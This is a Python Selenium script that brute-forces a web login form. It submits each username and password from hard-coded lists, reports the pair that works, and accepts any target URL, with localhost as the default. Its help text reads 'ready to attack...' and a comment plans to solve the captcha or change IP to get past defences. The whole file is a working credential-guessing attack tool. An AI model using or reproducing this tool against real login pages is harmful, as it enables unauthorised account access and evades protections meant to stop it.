from selenium import webdriver
import argparse

usernames = ['happy']
passwords = ['141516320', '1414amir', '15891jdhf', 'passjdhf']


def main(driver=r'C:/geckodriver', url="http://localhost:8000/login/try_login/"):
    driver = webdriver.Firefox(executable_path=driver)
    driver.get(url)

    for u in usernames:
        privous_pass = None
        for p in passwords:
            try:
                username = driver.find_element_by_name("username")
            except:
                print("username and password found:", u, privous_pass)
                driver.close()
                return
            username.clear()
            username.send_keys(u)

            password = driver.find_element_by_name("password")
            password.clear()
            password.send_keys(p)
            res = driver.find_element_by_xpath("/html/body/form[1]/div/button").click()

            # print(driver.page_source)
            privous_pass = p
            try:
                captcha = driver.find_element_by_name("captcha")
                # TODO solve captcha or change ip
            except:
                pass
    driver.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ready to attack...')
    parser.add_argument('--driver', metavar='path', required=False,
                        help='the path to geckodriver')
    parser.add_argument('--url', metavar='url', required=False,
                        help='url')
    args = parser.parse_args()
    if args.driver is not None and args.url is not None:
        main(driver=args.driver, url=args.url)
    elif args.driver is not None:
        main(driver=args.driver)
    elif args.url is not None:
        main(url=args.url)
    else:
        main()
